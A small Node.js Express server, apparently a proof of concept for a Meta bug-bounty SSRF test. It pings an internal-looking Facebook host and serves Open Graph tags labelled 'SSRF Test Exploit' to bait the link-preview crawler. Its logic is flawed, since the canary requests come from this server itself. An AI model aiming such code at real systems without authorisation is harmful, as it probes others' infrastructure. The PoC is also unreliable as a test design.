const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', async (req, res) => {
    const canaryUrl = 'https://internalfb.com';
    
    try {
        // إرسال طلبات الخلفية للكناري (GET & POST) لضمان التسجيل
        axios.get(canaryUrl, { timeout: 3000 }).catch(() => {});
        axios.post(canaryUrl, {}, { timeout: 3000 }).catch(() => {});
        
        // بناء صفحة HTML تحتوي على وسوم og:image و og:title المطلوبة من فيسبوك
        const htmlResponse = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Meta Bug Bounty PoC</title>
            <meta property="og:title" content="SSRF Test Exploit" />
            <meta property="og:description" content="Testing Meta Server-Side Requests" />
            <meta property="og:image" content="https://google.com" />
            <meta property="og:url" content="https://onrender.com" />
        </head>
        <body>
            <h1>Success 200 OK</h1>
        </body>
        </html>
        `;
        
        res.status(200).send(htmlResponse);
    } catch (error) {
        res.status(200).send('Success');
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
